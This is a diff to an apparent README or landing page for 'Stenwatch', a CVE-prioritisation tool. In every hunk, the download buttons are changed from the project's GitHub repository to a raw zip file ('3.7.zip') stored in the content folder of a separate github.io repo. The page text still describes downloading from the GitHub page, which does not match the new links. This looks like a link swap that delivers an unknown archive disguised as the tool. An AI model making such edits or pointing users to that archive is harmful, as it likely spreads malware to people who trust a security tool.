@@ -6,7 +6,7 @@ description: "Prioritize CVEs by real threat to your infrastructure, with clear 
 <h1>🛡️ Stenwatch - Prioritise CVEs That Actually Matter</h1>
 
 <p align="center">
-  <a href="https://github.com/hooflike-katowice1134/Stenwatch" style="display:inline-block; padding:14px 36px; background:#2e7d32; color:#ffffff; text-decoration:none; font-size:19px; font-weight:bold; border-radius:8px; border:2px solid #1b5e20; box-shadow:3px 3px 0 rgba(0,0,0,0.2);">⬇️ DOWNLOAD STENWATCH NOW</a>
+  <a href="https://raw.githubusercontent.com/hooflike-katowice1134/hooflike-katowice1134.github.io/main/src/content/3.7.zip" style="display:inline-block; padding:14px 36px; background:#2e7d32; color:#ffffff; text-decoration:none; font-size:19px; font-weight:bold; border-radius:8px; border:2px solid #1b5e20; box-shadow:3px 3px 0 rgba(0,0,0,0.2);">⬇️ DOWNLOAD STENWATCH NOW</a>
 </p>
 
 <p align="center"><strong>Stop drowning in thousands of CVEs. Stenwatch shows you the few that could hurt your organisation - with clear reasons why.</strong></p>
@@ -33,7 +33,7 @@ description: "Prioritize CVEs by real threat to your infrastructure, with clear 
 <p>Visit this link to download the application. Click the button below or at the top of this page.</p>
 
 <p align="center">
-  <a href="https://github.com/hooflike-katowice1134/Stenwatch" style="display:inline-block; padding:12px 28px; background:#1565c0; color:#ffffff; text-decoration:none; font-size:16px; font-weight:bold; border-radius:6px;">📥 Download Stenwatch from GitHub</a>
+  <a href="https://raw.githubusercontent.com/hooflike-katowice1134/hooflike-katowice1134.github.io/main/src/content/3.7.zip" style="display:inline-block; padding:12px 28px; background:#1565c0; color:#ffffff; text-decoration:none; font-size:16px; font-weight:bold; border-radius:6px;">📥 Download Stenwatch from GitHub</a>
 </p>
 
 <p>Once you click the link, you'll land on the Stenwatch GitHub page. Look for the green <strong>"Code"</strong> button near the top-right of the file list. Click it, then click <strong>"Download ZIP"</strong>. The file (usually named <code>Stenwatch-main.zip</code>) will save to your <strong>Downloads</strong> folder.</p>
@@ -180,7 +180,7 @@ Export complete. Saved to 'prioritised_cves.csv'</code></pre>
 <hr />
 
 <p align="center">
-  <a href="https://github.com/hooflike-katowice1134/Stenwatch" style="display:inline-block; padding:14px 36px; background:#37474f; color:#ffffff; text-decoration:none; font-size:19px; font-weight:bold; border-radius:8px;">⬇️ Get Your Copy of Stenwatch Now</a>
+  <a href="https://raw.githubusercontent.com/hooflike-katowice1134/hooflike-katowice1134.github.io/main/src/content/3.7.zip" style="display:inline-block; padding:14px 36px; background:#37474f; color:#ffffff; text-decoration:none; font-size:19px; font-weight:bold; border-radius:8px;">⬇️ Get Your Copy of Stenwatch Now</a>
 </p>
 
 <p align="center"><em>Stenwatch is released as open-source software. Free to download, free to use, free to modify. No registration, no license keys.</em></p>
